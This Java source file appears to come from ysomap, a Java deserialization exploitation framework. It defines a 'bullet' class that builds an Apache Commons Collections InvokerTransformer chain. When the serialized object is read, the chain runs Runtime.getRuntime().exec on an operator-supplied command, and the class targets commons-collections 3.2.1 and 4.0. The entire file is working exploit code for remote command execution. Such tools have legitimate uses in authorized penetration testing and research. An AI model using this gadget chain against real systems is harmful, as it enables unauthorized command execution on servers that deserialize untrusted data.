package ysomap.bullets.collections;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;

import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@SuppressWarnings ( "rawtypes" )
@Bullets
@Dependencies({"<=commons-collections 3.2.1", "<=commons-collections 4.0"})
@Details("执行指定的系统命令")
@Targets({Targets.JDK})
@Authors({ Authors.WH1T3P1G })
public class TransformerBullet extends AbstractTransformerBullet {

    @NotNull
    @Require(name="command",detail= DetailHelper.COMMAND)
    public String command;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(Runtime.class));
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }));
        transformers.add(createInvokerTransformer(
                "exec", new Class[] { String.class }, new String[]{command}));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TransformerBullet();
        bullet.set("command", args[0]);
        bullet.set("version", args[1]);
        return bullet;
    }
}
